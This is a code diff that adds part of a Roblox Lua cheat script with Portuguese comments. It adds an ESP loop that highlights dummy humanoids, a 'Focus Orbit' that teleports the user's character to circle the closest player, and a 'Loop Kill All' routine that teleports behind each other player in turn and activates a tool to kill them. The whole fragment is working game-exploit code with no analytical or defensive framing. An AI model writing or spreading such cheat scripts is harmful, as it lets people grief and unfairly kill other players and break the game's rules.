+    while task.wait(1) do
+        pcall(function()
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid") and not Players:GetPlayerFromCharacter(obj) then
+                    local hl = obj:FindFirstChild("VoidDummyESP")
+                    if espDummyActive then
+                        if not hl then
+                            hl = Instance.new("Highlight")
+                            hl.Name = "VoidDummyESP"
+                            hl.FillColor = Color3.fromRGB(0, 255, 150)
+                            hl.Parent = obj
+                        end
+                    elseif hl then
+                        hl:Destroy()
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Lógica do Focus Orbit
+local orbitAngle = 0
+local orbitRadius = 4.5
+local orbitSpeed = 12
+
+local function GetClosestPlayer()
+    local closest, dist = nil, math.huge
+    local myChar = LocalPlayer.Character
+    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
+    if not myHrp then return nil end
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local tHrp = p.Character:FindFirstChild("HumanoidRootPart")
+            local tHum = p.Character:FindFirstChildOfClass("Humanoid")
+            if tHrp and tHum and tHum.Health > 0 then
+                local d = (myHrp.Position - tHrp.Position).Magnitude
+                if d < dist then
+                    dist = d
+                    closest = tHrp
+                end
+            end
+        end
+    end
+    return closest
+end
+
+RunService.RenderStepped:Connect(function(dt)
+    if focusActive then
+        local myChar = LocalPlayer.Character
+        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
+        local targetHrp = GetClosestPlayer()
+        if myHrp and targetHrp then
+            myHrp.AssemblyLinearVelocity = Vector3.zero
+            orbitAngle = orbitAngle + (orbitSpeed * dt)
+            local offset = Vector3.new(math.cos(orbitAngle) * orbitRadius, 0, math.sin(orbitAngle) * orbitRadius)
+            myHrp.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
+        end
+    end
+end)
+
+-- Loop Kill All
+task.spawn(function()
+    while true do
+        task.wait(0.05)
+        if gojoActive and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local myHrp = LocalPlayer.Character.HumanoidRootPart
+            local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool") or (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChildOfClass("Tool"))
+            if tool and tool.Parent ~= LocalPlayer.Character then tool.Parent = LocalPlayer.Character end
+            for _, target in pairs(Players:GetPlayers()) do
+                if not gojoActive then break end
+                if target ~= LocalPlayer and target.Character then
+                    local tHum = target.Character:FindFirstChildOfClass("Humanoid")
+                    local tHrp = target.Character:FindFirstChild("HumanoidRootPart")
+                    if tHum and tHum.Health > 0 and tHrp then
+                        myHrp.AssemblyLinearVelocity = Vector3.zero
+                        myHrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, -1.5) * CFrame.Angles(0, math.pi, 0)
+                        if tool then tool:Activate() end
+                        task.wait(0.05)
+                    end
+                end
+            end
+        end
+    end
+end)
